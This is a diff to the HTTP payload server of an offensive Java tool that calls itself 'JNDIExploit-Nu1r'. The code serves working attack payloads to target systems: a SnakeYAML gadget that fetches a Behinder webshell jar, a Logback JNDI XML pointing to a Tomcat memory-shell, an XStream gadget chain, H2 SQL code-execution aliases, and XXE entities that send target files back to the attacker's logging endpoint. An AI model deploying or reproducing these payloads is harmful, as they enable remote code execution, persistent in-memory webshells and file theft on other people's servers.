@@ -1,6 +1,7 @@
 package com.nu1r.jndi;
 
 import cn.hutool.core.io.file.FileReader;
+import com.nu1r.jndi.gadgets.utils.Ltime;
 import com.nu1r.jndi.template.CommandTemplate;
 import com.nu1r.jndi.template.DnslogTemplate;
 import com.nu1r.jndi.template.ReverseShellTemplate;
@@ -24,6 +25,11 @@ import java.util.zip.ZipEntry;
 import static org.fusesource.jansi.Ansi.ansi;
 
 public class HTTPServer {
+    //获取根目录路径
+    public static void main(String[] args) {
+        System.out.println(cwd);
+    }
+
     public static String cwd = System.getProperty("user.dir");
 
     public static void start() throws IOException {
@@ -31,40 +37,31 @@ public class HTTPServer {
         HttpServer httpServer = HttpServer.create(new InetSocketAddress(Config.httpPort), 0);
         httpServer.createContext("/", new HttpHandler() {
             @Override
-            public void handle(HttpExchange httpExchange){
+            public void handle(HttpExchange httpExchange) {
                 try {
-                    System.out.println(ansi().eraseScreen().render(
-                            "   @|green █████\\|@ @|red ██\\   ██\\|@ @|yellow ███████\\|@  @|MAGENTA ██████\\|@       @|CYAN ██\\   ██\\ ██\\   ██\\|@ \n" +
-                                    "   @|green \\__██ ||@@|red ███\\  ██ ||@@|yellow ██  __██\\|@ @|MAGENTA \\_██  _||@      @|CYAN ███\\  ██ |██ |  ██ ||@ @|BG_GREEN v1.5.6|@\n" +
-                                    "      @|green ██ ||@@|red ████\\ ██ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@        @|CYAN ████\\ ██ |██ |  ██ ||@ @|BG_CYAN JNDIExploit-Nu1r|@\n" +
-                                    "      @|green ██ ||@@|red ██ ██\\██ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@██████\\ @|CYAN ██ ██\\██ |██ |  ██ ||@\n" +
-                                    "@|green ██\\   ██ ||@@|red ██ \\████ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@\\______|@|CYAN ██ \\████ |██ |  ██ ||@\n" +
-                                    "@|green ██ |  ██ ||@@|red ██ |\\███ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@        @|CYAN ██ |\\███ |██ |  ██ ||@\n" +
-                                    "@|green \\██████  ||@@|red ██ | \\██ ||@@|yellow ███████  ||@@|MAGENTA ██████\\|@       @|CYAN ██ | \\██ |\\██████  ||@\n" +
-                                    "@|green  \\______/|@@|red  \\__|  \\__||@@|yellow \\_______/|@ @|MAGENTA \\______||@      @|CYAN \\__|  \\__| \\______/|@"));
-                    System.out.println( ansi().render(Ltime.getLocalTime() + "@|bg_GREEN -----------------------------------------------------------------------------------|@"));
-                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA New HTTP Request From >> |@" + httpExchange.getRemoteAddress() + "  " + httpExchange.getRequestURI()));
+                    System.out.println(ansi().render(Ltime.getLocalTime() + "@|bg_GREEN  HTTP-------------------------------------------------------------------------------|@"));
+                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA New HTTP Request From >> |@" + httpExchange.getRemoteAddress() + "  " + httpExchange.getRequestURI()));
 
                     String path = httpExchange.getRequestURI().getPath();
-                    if(path.endsWith(".class")){
+                    if (path.endsWith(".class")) {
                         handleClassRequest(httpExchange);
-                    }else if(path.endsWith(".wsdl")){
+                    } else if (path.endsWith(".wsdl")) {
                         handleWSDLRequest(httpExchange);
-                    }else if(path.endsWith(".jar")){
+                    } else if (path.endsWith(".jar")) {
                         handleJarRequest(httpExchange);
-                    }else if(path.startsWith("/xxelog")){
+                    } else if (path.startsWith("/xxelog")) {
                         handleXXELogRequest(httpExchange);
-                    }else if(path.endsWith(".sql")){
+                    } else if (path.endsWith(".sql")) {
                         handleSQLRequest(httpExchange);
-                    }else if (path.endsWith(".groovy")){
+                    } else if (path.endsWith(".groovy")) {
                         handlerGroovyRequest(httpExchange);
-                    }else if(path.endsWith(".xml")) {
+                    } else if (path.endsWith(".xml")) {
                         handleXMLRequest(httpExchange);
-                    }else if(path.endsWith(".txt")) {
+                    } else if (path.endsWith(".txt")) {
                         handleTXTRequest(httpExchange);
-                    }else if(path.endsWith(".yml")){
+                    } else if (path.endsWith(".yml")) {
                         handleYmlRequest(httpExchange);
-                    }else{
+                    } else {
                         handleFileRequest(httpExchange);
                     }
                 } catch (Exception e) {
@@ -75,21 +72,21 @@ public class HTTPServer {
 
         httpServer.setExecutor(null);
         httpServer.start();
-        System.out.println( ansi().render("@|green [+]|@ @|MAGENTA HTTP Server Start Listening on >> |@" + Config.httpPort + "..."));
+        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA HTTP Server Start Listening on >> |@" + Config.httpPort + "..."));
     }
 
     private static void handleFileRequest(HttpExchange exchange) throws Exception {
-        String path = exchange.getRequestURI().getPath();
-        String filename =  cwd + File.separator + "data" + File.separator +path.substring(path.lastIndexOf("/") + 1);
-        File file = new File(filename);
-        if (file.exists()){
-            byte[] bytes = new byte[(int) file.length()];
+        String path     = exchange.getRequestURI().getPath();
+        String filename = cwd + File.separator + "data" + File.separator + path.substring(path.lastIndexOf("/") + 1);
+        File   file     = new File(filename);
+        if (file.exists()) {
+            byte[]          bytes           = new byte[(int) file.length()];
             FileInputStream fileInputStream = new FileInputStream(file);
             fileInputStream.read(bytes);
             exchange.sendResponseHeaders(200, file.length() + 1);
             exchange.getResponseBody().write(bytes);
-        }else {
-            System.out.println( ansi().render("@|red [!] Response Code: |@" + 404));
+        } else {
+            System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
             exchange.sendResponseHeaders(404, 0);
         }
         exchange.close();
@@ -99,33 +96,33 @@ public class HTTPServer {
     private static void handleYmlRequest(HttpExchange exchange) throws IOException {
         String path = exchange.getRequestURI().getPath();
 //        String host = exchange.getRequestURI().getHost();
-        String YamlName =  path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
+        String YamlName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
         String bytes = "!!javax.script.ScriptEngineManager [\n" +
                 "  !!java.net.URLClassLoader [[\n" +
-                "    !!java.net.URL [\"http://"+ Config.ip +":"+ Config.httpPort + "/behinder3.jar\"]\n" +
+                "    !!java.net.URL [\"http://" + Config.ip + ":" + Config.httpPort + "/behinder3.jar\"]\n" +
                 "  ]]\n" +
                 "]\n";
 
         if (YamlName.equalsIgnoreCase("snake")) {
-            System.out.println( ansi().render("@|green [+] Response Code: |@" + 200));
+            System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
 //            exchange.getResponseHeaders().set("Content-type","application/octet-stream");
             exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
 //            exchange.sendResponseHeaders(200, yaml.getBytes().length + 1);
             exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));
 //            exchange.getResponseBody().write(yaml.getBytes("UTF-8"));
-        }else {
-            String pa = cwd + File.separator + "data";
-            File file = new File(pa + File.separator + YamlName + ".yml");
-            if (file.exists()){
+        } else {
+            String pa   = cwd + File.separator + "data";
+            File   file = new File(pa + File.separator + YamlName + ".yml");
+            if (file.exists()) {
                 byte[] bytes1 = new byte[(int) file.length()];
                 try (FileInputStream fileInputStream = new FileInputStream(file)) {
                     fileInputStream.read(bytes1);
                 }
-                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
+                exchange.getResponseHeaders().set("Content-type", "application/octet-stream");
                 exchange.sendResponseHeaders(200, file.length() + 1);
                 exchange.getResponseBody().write(bytes1);
             } else {
-                System.out.println( ansi().render("@|red [!] Response Code: |@" + 404));
+                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
                 exchange.sendResponseHeaders(404, 0);
             }
 
@@ -134,29 +131,29 @@ public class HTTPServer {
     }
 
     public static void handleTXTRequest(HttpExchange exchange) throws IOException {
-        String path = exchange.getRequestURI().getPath();
-        String txtname =  path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
-        if (txtname.equalsIgnoreCase("isok")){
-            System.out.println( ansi().render("@|green [+] Response Code: |@" + 200));
+        String path    = exchange.getRequestURI().getPath();
+        String txtname = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
+        if (txtname.equalsIgnoreCase("isok")) {
+            System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
             byte[] bytes = "success!".getBytes();
-            exchange.getResponseHeaders().set("Content-type","application/octet-stream");
+            exchange.getResponseHeaders().set("Content-type", "application/octet-stream");
             exchange.sendResponseHeaders(200, bytes.length + 1);
             exchange.getResponseBody().write(bytes);
-        }else {
-            String pa = cwd + File.separator + "data";
-            File file = new File(pa + File.separator + txtname + ".txt");
+        } else {
+            String pa   = cwd + File.separator + "data";
+            File   file = new File(pa + File.separator + txtname + ".txt");
 
-            if (file.exists()){
+            if (file.exists()) {
 
                 byte[] bytes1 = new byte[(int) file.length()];
                 try (FileInputStream fileInputStream = new FileInputStream(file)) {
                     fileInputStream.read(bytes1);
                 }
-                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
+                exchange.getResponseHeaders().set("Content-type", "application/octet-stream");
                 exchange.sendResponseHeaders(200, file.length() + 1);
                 exchange.getResponseBody().write(bytes1);
-            }else {
-                System.out.println( ansi().render("@|red [!] Response Code: @|" + 404));
+            } else {
+                System.out.println(ansi().render("@|red [!] Response Code: @|" + 404));
                 exchange.sendResponseHeaders(404, 0);
             }
         }
@@ -167,7 +164,7 @@ public class HTTPServer {
         String path = exchange.getRequestURI().getPath();
 //        String host = exchange.getRequestURI().getHost();
         String xmlName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
-        String bytes = "<configuration>\n  <insertFromJNDI env-entry-name=\"ldap://" + Config.ip + ":"+ Config.ldapPort + "/TomcatBypass/TomcatMemshell3\" as=\"appName\" />\n</configuration>";
+        String bytes   = "<configuration>\n  <insertFromJNDI env-entry-name=\"ldap://" + Config.ip + ":" + Config.ldapPort + "/TomcatBypass/TomcatMemshell3\" as=\"appName\" />\n</configuration>";
         String xstream = "<linked-hash-set>\n" +
                 "    <jdk.nashorn.internal.objects.NativeString>\n" +
                 "      <flags>0</flags>\n" +
@@ -263,33 +260,33 @@ public class HTTPServer {
                 "  </entry>\n" +
                 "</linked-hash-set>";
 
-        if(xmlName.equals("a")) {
-            System.out.println( ansi().render("@|green [+] Response Code: |@" + 200));
+        if (xmlName.equals("a")) {
+            System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
 
 
             exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
             exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));
-        }else if (xmlName.equals("x")){
-            System.out.println( ansi().render("@|green [+] Response Code: |@" + 200));
-            exchange.getResponseHeaders().add("Content-Type","application/xml; charset=utf-8");
+        } else if (xmlName.equals("x")) {
+            System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
+            exchange.getResponseHeaders().add("Content-Type", "application/xml; charset=utf-8");
             exchange.sendResponseHeaders(200, xstream.getBytes().length + 1);
             exchange.getResponseBody().write(xstream.getBytes(StandardCharsets.UTF_8));
 
-        }else {
-            String pa = cwd + File.separator + "data";
-            File file = new File(pa + File.separator + xmlName + ".xml");
+        } else {
+            String pa   = cwd + File.separator + "data";
+            File   file = new File(pa + File.separator + xmlName + ".xml");
 
-            if (file.exists()){
+            if (file.exists()) {
                 byte[] bytes1 = new byte[(int) file.length()];
                 try (FileInputStream fileInputStream = new FileInputStream(file)) {
                     fileInputStream.read(bytes1);
                 }
-                exchange.getResponseHeaders().add("Content-Type","application/xml; charset=utf-8");
+                exchange.getResponseHeaders().add("Content-Type", "application/xml; charset=utf-8");
 //                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
                 exchange.sendResponseHeaders(200, file.length() + 1);
                 exchange.getResponseBody().write(bytes1);
-            }else {
-                System.out.println( ansi().render("@|red [!] Response Code: |@" + 404));
+            } else {
+                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
                 exchange.sendResponseHeaders(404, 0);
             }
 
@@ -299,12 +296,12 @@ public class HTTPServer {
     }
 
     public static void handleSQLRequest(HttpExchange exchange) throws IOException {
-        String path = exchange.getRequestURI().getPath();
-        String host = exchange.getRequestURI().getHost();
+        String path    = exchange.getRequestURI().getPath();
+        String host    = exchange.getRequestURI().getHost();
         String sqlName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
 
-        if(sqlName.equalsIgnoreCase("echo")){
-            System.out.println( ansi().render("@|green [+] Response Code: |@" + 200));
+        if (sqlName.equalsIgnoreCase("echo")) {
+            System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
 
             String name = String.valueOf(System.nanoTime());
             String bytes = "CREATE ALIAS " + name + " AS CONCAT('void ex()throws Exception" +
@@ -312,7 +309,7 @@ public class HTTPServer {
                     "CALL " + name + "();\"}";
             exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
             exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));
-        }else if(sqlName.equalsIgnoreCase("inject")){
+        } else if (sqlName.equalsIgnoreCase("inject")) {
             System.out.println("@|green  Response Code: |@" + 200);
 
             String name = String.valueOf(System.nanoTime());
@@ -322,12 +319,12 @@ public class HTTPServer {
             exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
             exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));
 
-        }else{
+        } else {
 
-            String pa = cwd + File.separator + "data";
-            File file = new File(pa + File.separator + sqlName + ".sql");
+            String pa   = cwd + File.separator + "data";
+            File   file = new File(pa + File.separator + sqlName + ".sql");
 
-            if (file.exists()){
+            if (file.exists()) {
                 byte[] bytes = new byte[(int) file.length()];
                 try (FileInputStream fileInputStream = new FileInputStream(file)) {
                     fileInputStream.read(bytes);
@@ -336,7 +333,7 @@ public class HTTPServer {
                 exchange.sendResponseHeaders(200, file.length() + 1);
                 exchange.getResponseBody().write(bytes);
             } else {
-                System.out.println( ansi().render("@|red [!] Response Code: |@" + 404));
+                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
                 exchange.sendResponseHeaders(404, 0);
             }
         }
@@ -344,13 +341,13 @@ public class HTTPServer {
     }
 
     public static void handlerGroovyRequest(HttpExchange exchange) throws IOException {
-        String path = exchange.getRequestURI().getPath();
-        String host = exchange.getRequestURI().getHost();
-        String exp = "/TomcatBypass/TomcatEcho";
+        String path       = exchange.getRequestURI().getPath();
+        String host       = exchange.getRequestURI().getHost();
+        String exp        = "/TomcatBypass/TomcatEcho";
         String groovyName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
 
-        if(groovyName.equalsIgnoreCase("groovyecho")){
-            System.out.println( ansi().render("@|green [+] Response Code: |@" + 200));
+        if (groovyName.equalsIgnoreCase("groovyecho")) {
+            System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
 
             String bytes = "class demo {\n" +
                     "    static void main(){\n" +
@@ -363,11 +360,11 @@ public class HTTPServer {
             exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
             exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));
 
-        }else{
-            String pa = cwd + File.separator + "data";
-            File file = new File(pa + File.separator + groovyName + ".groovy");
+        } else {
+            String pa   = cwd + File.separator + "data";
+            File   file = new File(pa + File.separator + groovyName + ".groovy");
 
-            if (file.exists()){
+            if (file.exists()) {
                 byte[] bytes = new byte[(int) file.length()];
                 try (FileInputStream fileInputStream = new FileInputStream(file)) {
                     fileInputStream.read(bytes);
@@ -376,7 +373,7 @@ public class HTTPServer {
                 exchange.sendResponseHeaders(200, file.length() + 1);
                 exchange.getResponseBody().write(bytes);
             } else {
-                System.out.println( ansi().render("@|red [!] Response Code: |@" + 404));
+                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
                 exchange.sendResponseHeaders(404, 0);
             }
 
@@ -387,37 +384,37 @@ public class HTTPServer {
 
     public static void handleXXELogRequest(HttpExchange exchange) throws IllegalAccessException, IOException {
         Object exchangeImpl = FieldUtils.readField(exchange, "impl", true);
-        Object request = FieldUtils.readField(exchangeImpl, "req", true);
-        String startLine = (String) FieldUtils.readField(request, "startLine", true);
+        Object request      = FieldUtils.readField(exchangeImpl, "req", true);
+        String startLine    = (String) FieldUtils.readField(request, "startLine", true);
 
-        System.out.println( ansi().render("@|green [+] XXE Attack Result: |@" + startLine));
+        System.out.println(ansi().render("@|green [+] XXE Attack Result: |@" + startLine));
         exchange.sendResponseHeaders(200, 0);
         exchange.close();
     }
 
-    private static void handleJarRequest(HttpExchange exchange) throws IOException{
-        String path = exchange.getRequestURI().getPath();
+    private static void handleJarRequest(HttpExchange exchange) throws IOException {
+        String path    = exchange.getRequestURI().getPath();
         String jarName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
 
-        if (jarName.equalsIgnoreCase("behinder3")){
-            byte[] bytes;
-            String filename =  cwd + File.separator +"data" + File.separator + "behinder3.jar";
-            FileReader fileReader = new FileReader(filename,"UTF-8");
+        if (jarName.equalsIgnoreCase("behinder3")) {
+            byte[]     bytes;
+            String     filename   = cwd + File.separator + "data" + File.separator + "behinder3.jar";
+            FileReader fileReader = new FileReader(filename, "UTF-8");
             bytes = fileReader.readBytes();
             exchange.sendResponseHeaders(200, bytes.length + 1);
             exchange.getResponseBody().write(bytes);
-        }else {
+        } else {
 
-            String filename =  cwd + File.separator +"data" + File.separator + jarName + ".jar";
-            File file = new File(filename);
-            if (file.exists()){
-                byte[] bytes;
-                FileReader fileReader = new FileReader(filename,"UTF-8");
+            String filename = cwd + File.separator + "data" + File.separator + jarName + ".jar";
+            File   file     = new File(filename);
+            if (file.exists()) {
+                byte[]     bytes;
+                FileReader fileReader = new FileReader(filename, "UTF-8");
                 bytes = fileReader.readBytes();
                 exchange.sendResponseHeaders(200, bytes.length + 1);
                 exchange.getResponseBody().write(bytes);
-            }else {
-                System.out.println( ansi().render("@|red [!] Response Code: |@" + 404));
+            } else {
+                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
                 exchange.sendResponseHeaders(404, 0);
             }
 
@@ -425,36 +422,37 @@ public class HTTPServer {
         exchange.close();
 
 
-
     }
 
-    private static void handleClassRequest(HttpExchange exchange) throws IOException{
-        String path = exchange.getRequestURI().getPath();
+    private static void handleClassRequest(HttpExchange exchange) throws IOException {
+        String path      = exchange.getRequestURI().getPath();
         String className = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
-        System.out.println( ansi().render("@|green [+] Receive ClassRequest: |@" + className + ".class"));
+        System.out.println(ansi().render("@|green [+] Receive ClassRequest: |@" + className + ".class"));
 
         //先从Cache中加载
-        if(Cache.contains(className)){
-            System.out.println( ansi().render("@|green [+] Response Code: |@" + 200));
+        if (Cache.contains(className)) {
+            System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
 
             byte[] bytes = Cache.get(className);
             exchange.sendResponseHeaders(200, bytes.length);
             //这一步返回http请求
             exchange.getResponseBody().write(bytes);
-        }else{//找不到就从/data目录下照
-            String pa = cwd + File.separator + "data";
-            File file = new File(pa + File.separator + className + ".class");
+        } else {//找不到就从/org目录下照
+            //String pa   = cwd + File.separator + "org";
+            String pa   = cwd + path;
+            File   file = new File(pa);
 
-            if (file.exists()){
+            if (file.exists()) {
                 byte[] bytes = new byte[(int) file.length()];
                 try (FileInputStream fileInputStream = new FileInputStream(file)) {
                     fileInputStream.read(bytes);
                 }
-                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
+                exchange.getResponseHeaders().set("Content-type", "application/octet-stream");
                 exchange.sendResponseHeaders(200, file.length() + 1);
                 exchange.getResponseBody().write(bytes);
-            }else {
-                System.out.println( ansi().render("@|red [!] Response Code: |@" + 404));
+                System.out.println(ansi().render("@|green [+] 内存马远程类加载成功(●'◡'●) |@" + 200));
+            } else {
+                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
                 exchange.sendResponseHeaders(404, 0);
             }
 
@@ -463,12 +461,12 @@ public class HTTPServer {
     }
 
     private static void handleWSDLRequest(HttpExchange exchange) throws Exception {
-        String query = exchange.getRequestURI().getQuery();
+        String              query  = exchange.getRequestURI().getQuery();
         Map<String, String> params = parseQuery(query);
 
         String path = exchange.getRequestURI().getPath().substring(1);
 
-        if(path.startsWith("list")) {
+        if (path.startsWith("list")) {
             //intended to list directories or read files on server
             String file = params.get("file");
             if (file != null && !file.isEmpty()) {
@@ -482,17 +480,17 @@ public class HTTPServer {
                         "  &ddd;\n" +
                         "</definitions>";
 
-                System.out.println( ansi().render("@|green [+] Response Code: |@" + 200));
+                System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
                 exchange.sendResponseHeaders(200, listWsdl.getBytes().length);
                 exchange.getResponseBody().write(listWsdl.getBytes());
             } else {
-                System.out.println( ansi().render("@|red [!] Missing or wrong argument|@"));
-                System.out.println( ansi().render("@|red [!] Response Code: |@" + 404));
+                System.out.println(ansi().render("@|red [!] Missing or wrong argument|@"));
+                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
                 exchange.sendResponseHeaders(404, 0);
             }
             exchange.close();
 
-        }else if(path.startsWith("upload")) {
+        } else if (path.startsWith("upload")) {
             String type = params.get("type");
 
             String[] args = null;
@@ -509,42 +507,42 @@ public class HTTPServer {
                 String uploadWsdl = "<!DOCTYPE a SYSTEM \"jar:http://" + Config.ip + ":" + Config.httpPort +
                         "/" + jarName + ".jar!/file.txt\"><a></a>";
 
-                System.out.println( ansi().render("@|green [+] Response Code: |@" + 200));
+                System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
                 exchange.sendResponseHeaders(200, uploadWsdl.getBytes().length);
                 exchange.getResponseBody().write(uploadWsdl.getBytes());
             } else {
-                System.out.println( ansi().render("@|red [!] Missing or wrong argument|@"));
-                System.out.println( ansi().render("@|red [!] Response Code: |@" + 404));
+                System.out.println(ansi().render("@|red [!] Missing or wrong argument|@"));
+                System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
                 exchange.sendResponseHeaders(404, 0);
             }
             exchange.close();
-        }else if(path.startsWith("http"))  {
+        } else if (path.startsWith("http")) {
             String xxhttp = "<!ENTITY % ccc '<!ENTITY ddd &#39;<import namespace=\"uri\" location=\"http://" +
                     Config.ip + ":" + Config.httpPort + "/xxelog?%aaa;\"/>&#39;>'>%ccc;";
-            System.out.println( ansi().render("@|green [+] Response Code: |@" + 200));
+            System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
             exchange.sendResponseHeaders(200, xxhttp.getBytes().length);
             exchange.getResponseBody().write(xxhttp.getBytes());
             exchange.close();
-        }else{
-            System.out.println( ansi().render("@|red [!] Response Code: |@" + 404));
+        } else {
+            System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
             exchange.sendResponseHeaders(404, 0);
             exchange.close();
         }
     }
 
-    private static Map<String, String> parseQuery(String query){
-        Map<String,String> params = new HashMap<>();
+    private static Map<String, String> parseQuery(String query) {
+        Map<String, String> params = new HashMap<>();
 
-        try{
-            for(String str : query.split("&")){
-                try{
-                    String[] parts = str.split("=",2);
+        try {
+            for (String str : query.split("&")) {
+                try {
+                    String[] parts = str.split("=", 2);
                     params.put(parts[0], parts[1]);
-                }catch(Exception e){
+                } catch (Exception e) {
                     //continue
                 }
             }
-        }catch(Exception e){
+        } catch (Exception e) {
             //continue
         }
 
@@ -584,9 +582,9 @@ public class HTTPServer {
                 return null;
         }
 
-        System.out.println( ansi().render("@|green [+] Name of Class in Jar: |@" + className));
-        ByteArrayOutputStream bout = new ByteArrayOutputStream();
-        JarOutputStream jarOut = new JarOutputStream(bout);
+        System.out.println(ansi().render("@|green [+] Name of Class in Jar: |@" + className));
+        ByteArrayOutputStream bout   = new ByteArrayOutputStream();
+        JarOutputStream       jarOut = new JarOutputStream(bout);
         jarOut.putNextEntry(new ZipEntry(className + ".class"));
         jarOut.write(bytes);
         jarOut.closeEntry();
